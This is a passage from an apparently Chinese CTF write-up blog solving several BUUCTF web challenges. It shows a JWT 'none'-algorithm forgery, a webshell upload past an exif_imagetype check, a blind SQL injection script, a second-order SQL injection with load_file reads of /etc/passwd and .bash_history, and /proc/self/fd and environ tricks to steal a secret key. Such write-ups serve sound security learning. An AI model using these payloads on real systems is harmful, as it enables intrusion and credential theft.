class="token punctuation">&#123;</span>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到加密算法是HS256，尝试将其更改为None直接传入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwttoken <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token string">"secretid"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"aaaaa"</span><span class="token punctuation">,</span>  <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1649380156</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登录成功！</p><p>访问/api/flag拿到flag</p>        <h2 id="b01lers2020-Welcome-to-Earth"   >          <a href="#b01lers2020-Welcome-to-Earth" class="heading-link"><i class="fas fa-link"></i></a><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2>      <p>阴间题！！！！！！！！！！！</p><p>进去就疯狂跳转，总之就是不断查看源码不要跳转到die，最终跳转到fight查看js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Run to scramble original flag</span><span class="token comment">//console.log(scramble(flag, action));</span><span class="token keyword">function</span> <span class="token function">scramble</span><span class="token punctuation">(</span><span class="token parameter">flag<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> key<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">%</span> flag<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">let</span> temp <span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">check_action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> action <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"&#123;hey"</span><span class="token punctuation">,</span> <span class="token string">"_boy"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"s_im"</span><span class="token punctuation">,</span> <span class="token string">"ck!&#125;"</span><span class="token punctuation">,</span> <span class="token string">"_baa"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"pctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// TODO: unscramble function</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照人间语法拼出flag</p><pre class="line-numbers language-none"><code class="language-none">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="WUSTCTF2020-CV-Maker"   >          <a href="#WUSTCTF2020-CV-Maker" class="heading-link"><i class="fas fa-link"></i></a><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2>      <p>看到这种模版化的界面，尝试扫目录看看是不是代码审计，结果没有，乖乖注册登录，发现可以上传头像，空文件直接上传发现警告</p><pre class="line-numbers language-none"><code class="language-none">Warning: exif_imagetype(): Filename cannot be empty in &#x2F;var&#x2F;www&#x2F;html&#x2F;profile.php on line 76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>emmmmmmm，使用exif_imagetype可使用幻数头绕过，上传木马</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-08" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-08</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 22.05.39.png)</p><p>访问拿flag即可</p>        <h2 id="GYCTF2020-Ezsqli"   >          <a href="#GYCTF2020-Ezsqli" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2>      <p>布尔注入喵喵，脚本懒得贴了喵喵</p><pre class="line-numbers language-none"><code class="language-none">database：give_grandpa_pa_pa_pa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>information_schema被ban了，mysql.innodb_table_stats也被ban了，新新知识居然还有个能用的</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema&#x3D;database()table:f1ag_1s_h3r3_hhhhh,users2333333333333331^((select (&#39;~&#39;,&#39;~&#39;))&gt;(select * from f1ag_1s_h3r3_hhhhh))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最后就是无列名注入啦</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflagname<span class="token operator">=</span><span class="token string">"flag-&#123;1234567890bcdefg&#125;"</span>name<span class="token operator">=</span><span class="token string">",qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890"</span>url<span class="token operator">=</span><span class="token string">"http://4664ea16-9fe4-4020-bc20-7e556fa70991.node4.buuoj.cn:81/index.php"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"0^((select 1,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">')>(select * from f1ag_1s_h3r3_hhhhh))"</span></span><span class="token punctuation">&#125;</span>        tes<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> tes<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="网鼎杯-2018-Comment"   >          <a href="#网鼎杯-2018-Comment" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2>      <p>先爆破登录，zhangwei666</p><p>.git文件泄露</p><p>GitHack扫出后发现代码内容不全，使用Git恢复旧仓库</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//write_do.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显在comment处存在二次注入，又因为此处insert是带有换行的，所以不能直接使用#来进行注释，使用/**/进行多行注释，构造payload</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">category:0&#39;,content&#x3D;database(),&#x2F;*留言comment处:*&#x2F;#最终构造出的语句insert into commentset category &#x3D; &#39;0&#39;,content&#x3D;database(),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;insert into comment set category &#x3D; &#39;0&#39;,content&#x3D;database(),bo_id &#x3D; &#39;$bo_id&#39;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在回显留言即可看到结果</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-09" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-09</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 08.47.30.png)</p><p>按照这个方法查完全库也没有结果，尝试loadfile吧，不知道读啥，捞一下wp的结果</p><blockquote><p>load_file(‘文件绝对路径’)读取文件并返回文件内容为字符串。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。<br>一般用法步骤：<br>读/etc/init.d下的东西，这里有配置文件路径<br>?id=1’ union select 1,2,load_file(‘/etc/init.d/httpd’)<br>得到web安装路径<br>?id=1’ union select 1,2,load_file(‘/etc/apache/conf/httpd.conf’)<br>读取密码文件<br>?id=1’ union select 1,2,load_file(‘var/www/html/xxx.com/php/conn.inc.php’)</p></blockquote><p>先看/etc/passwd</p><pre class="line-numbers language-none"><code class="language-none">www:x:500:500:www:&#x2F;home&#x2F;www:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到跑web服务的用户</p><blockquote><p>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</p></blockquote><p>访问拿到用过的命令</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;tmp&#x2F; unzip html.zip rm -f html.zip cp -r html &#x2F;var&#x2F;www&#x2F; cd &#x2F;var&#x2F;www&#x2F;html&#x2F; rm -f .DS_Store service apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问/tmp/html/.DS_Store拿到文件夹内容，太长内容可能包含sql语句，使用16进制编码，发现文件<code>flag_8946e1ff1ee3e40f.php</code>，读取拿flag即可，记得读/var/www/html下的文件，tmp中的不正确</p>        <h2 id="watevrCTF-2019-Cookie-Store"   >          <a href="#watevrCTF-2019-Cookie-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2>      <p>cookiebase64解一下然后改了价格再传回去</p>        <h2 id="网鼎杯-2020-白虎组-PicDown"   >          <a href="#网鼎杯-2020-白虎组-PicDown" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2>      <p>PicDown，下载照片，尝试访问/etc/passwd下载成功，看来可以找找源码，没啥文件包含思路，看wp，是linux的进程文件</p><blockquote><p>可以通过/proc/pid/ 来 获 取 指 定 进 程 的 信 息 ， 例 如 内 存 映 射 、 CPU绑 定 信 息 等 等 。 如 果 某 个 进 程 想 要 获 取 本 进 程 的 系 统 信 息 ， 就 可 以 通 过 进 程 的pid来 访 问 /proc/ pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p></blockquote><p>其中的重要文件</p><pre class="line-numbers language-none"><code class="language-none">cmdlinecmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：cwdcwd文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录environenviron文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息fdfd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用</p><pre class="line-numbers language-none"><code class="language-none">1.获取当前启动进程的完成命令：cat &#x2F;proc&#x2F;self&#x2F;cmdline2.获取目标当前进程的运行目录与目录里的文件：ls -al &#x2F;proc&#x2F;self&#x2F;cwdls &#x2F;proc&#x2F;self&#x2F;cwd3.获得当前进程的可执行文件的完整路径：ls -al &#x2F;proc&#x2F;self&#x2F;exe3.获得当前进程的可执行文件的完整路径：ls -al &#x2F;proc&#x2F;self&#x2F;exe4.获取当前环境变量cat &#x2F;proc&#x2F;self&#x2F;environ5.获取当前进程打开的文件内容cat &#x2F;proc&#x2F;self&#x2F;fd&#x2F;&#123;id&#125;也可以是：cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;*    --*可以代替任意数字和字母<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题中我们可以访问一下这几个位置</p><pre class="line-numbers language-none"><code class="language-none">cmdlinepython2 app.pyenvironMAIL&#x3D;&#x2F;var&#x2F;mail&#x2F;appUSER&#x3D;appHOME&#x3D;&#x2F;home&#x2F;appLOGNAME&#x3D;appPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;gamesSHELL&#x3D;&#x2F;bin&#x2F;shPWD&#x3D;&#x2F;app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在运行位置拿到源码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#/proc/self/cwd/app.py</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> os<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到代码中打开了<code>/tmp/secret.txt</code>并且将其中的内容作为SECRET_KEY，所以我们访问到这个文件就行了，尝试直接读取发现失败，那么我们利用proc文件中的fd文件夹，id从1开始尝试，最终可以拿到该文件</p><pre class="line-numbers language-none"><code class="language-none">url&#x3D;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3p3EtoNP0wO7DG6ZNhqzIT9dOV5sbSosf2GIQSXCkFqM&#x3D;<span aria-hidden="true" 